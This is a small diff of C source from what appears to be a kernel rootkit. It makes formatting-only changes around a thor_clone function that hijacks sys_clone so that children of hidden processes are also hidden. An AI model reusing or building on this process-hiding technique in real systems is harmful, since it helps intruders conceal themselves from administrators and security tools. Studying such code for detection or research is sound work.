@@ -247,7 +247,7 @@ long thor_clone(unsigned long clone_flags, unsigned long newsp,
     hijack(sys_clone, thor_clone);
 
     /* if mother process was hidden child process */
-    if(hidden && ret != -1 && ret != 0) {
+    if (hidden && ret != -1 && ret != 0) {
         char pidname[6];
         LOG_DEBUG("(thor_clone) hiding child process: %hu", (unsigned short)ret);
         snprintf(pidname, 6, "%hu", (unsigned short)ret);
@@ -358,4 +358,3 @@ bool is_pid_hidden(const char *name)
 
     return false;
 }
-
